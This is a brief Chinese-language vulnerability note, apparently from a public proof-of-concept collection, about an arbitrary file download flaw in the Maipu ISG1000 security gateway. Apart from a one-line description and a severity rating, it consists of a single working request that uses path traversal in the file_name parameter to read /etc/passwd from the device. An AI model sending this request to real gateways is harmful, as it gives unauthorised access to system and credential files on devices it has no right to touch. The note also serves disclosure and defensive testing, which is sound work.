# 迈普 ISG1000安全网关 任意文件下载漏洞

## 漏洞描述
迈普 ISG1000安全网关 存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器任意文件

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登录页面如下

![](images/202202110950648.png)

请求的 POC 为

```plain
/webui/?g=sys_dia_data_down&file_name=../etc/passwd
```

